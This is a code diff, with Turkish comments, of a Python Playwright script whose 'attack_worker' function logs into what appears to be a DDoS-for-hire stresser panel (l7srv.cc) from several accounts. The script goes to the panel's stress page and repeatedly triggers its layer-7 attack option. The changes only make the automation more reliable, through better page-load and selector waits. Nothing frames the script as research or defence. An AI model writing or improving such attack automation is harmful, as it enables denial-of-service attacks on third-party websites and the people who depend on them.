@@ -66,8 +66,8 @@ def attack_worker(account):
 
                 print(f"[{username}] 🔐 Giriş sayfasına gidiliyor...")
                 try:
-                    # 1. Sayfayı yükle ve HTTP durum kodunu yakala
-                    response = page.goto("https://l7srv.cc/login", timeout=30000, wait_until="domcontentloaded")
+                    # 1. Sayfayı yükle, networkidle ile tüm JS yüklenene kadar bekle
+                    response = page.goto("https://l7srv.cc/login", timeout=30000, wait_until="networkidle")
                     if response:
                         print(f"[{username}] ✅ Sayfa yüklendi. HTTP Durum Kodu: {response.status}")
                         if response.status >= 400:
@@ -77,28 +77,26 @@ def attack_worker(account):
                         print(f"[{username}] ❌ Yanıt alınamadı (response None).")
                         raise Exception("No response")
                     
-                    # 2. DOM'un yüklenmesini bekle
-                    page.wait_for_load_state("domcontentloaded", timeout=10000)
-                    time.sleep(1)
-                    
-                    # 3. Kullanıcı adı alanının varlığını kontrol et
-                    if page.locator("#username").count() == 0:
-                        print(f"[{username}] ⚠️ #username alanı bulunamadı, sayfa farklı olabilir.")
-                    else:
+                    # 2. #username alanının gelmesini bekle (dinamik JS ile ekleniyorsa)
+                    try:
+                        page.wait_for_selector("#username", timeout=15000)
                         print(f"[{username}] ✅ #username alanı mevcut.")
+                    except Exception as sel_err:
+                        print(f"[{username}] ⚠️ #username alanı bulunamadı, sayfa farklı olabilir. Hata: {sel_err}")
+                        raise sel_err
 
-                    # 4. Formu doldur
+                    # 3. Formu doldur
                     print(f"[{username}] 📝 Form dolduruluyor...")
                     page.fill("#username", username)
                     page.fill("#password", password)
 
-                    # 5. Buton aktifleşene kadar bekle
+                    # 4. Buton aktifleşene kadar bekle
                     print(f"[{username}] ⏳ Buton aktifleşmesi bekleniyor...")
                     page.wait_for_selector("#loginNextBtn:not([disabled])", timeout=15000)
                     page.click("#loginNextBtn")
                     print(f"[{username}] 🖱️ Butona tıklandı.")
 
-                    # 6. Dashboard'a yönlenene kadar bekle
+                    # 5. Dashboard'a yönlenene kadar bekle
                     page.wait_for_url(lambda url: "/dash" in url, timeout=60000)
                     print(f"[{username}] ✅ Giriş başarılı, dashboard'a yönlendirildi.")
                     consecutive_errors = 0
@@ -128,10 +126,10 @@ def attack_worker(account):
                 # ---------- STRESS SAYFASI ----------
                 print(f"[{username}] 📡 Stress sayfasına gidiliyor...")
                 try:
-                    response = page.goto("https://l7srv.cc/dash/stress", timeout=30000, wait_until="domcontentloaded")
+                    response = page.goto("https://l7srv.cc/dash/stress", timeout=30000, wait_until="networkidle")
                     if response:
                         print(f"[{username}] ✅ Stress sayfası yüklendi. HTTP {response.status}")
-                    page.wait_for_load_state("domcontentloaded", timeout=10000)
+                    page.wait_for_load_state("networkidle", timeout=10000)
                     time.sleep(2)
                     if page.locator("#layer_7").count() == 0:
                         print(f"[{username}] ⚠️ #layer_7 bulunamadı, belki farklı bir sekme?")
@@ -173,7 +171,7 @@ def attack_worker(account):
                             time.sleep(2)
 
                         page.reload()
-                        page.wait_for_load_state("domcontentloaded", timeout=30000)
+                        page.wait_for_load_state("networkidle", timeout=30000)
                         time.sleep(2)
                         page.locator("#layer_7").click()
                         time.sleep(1)
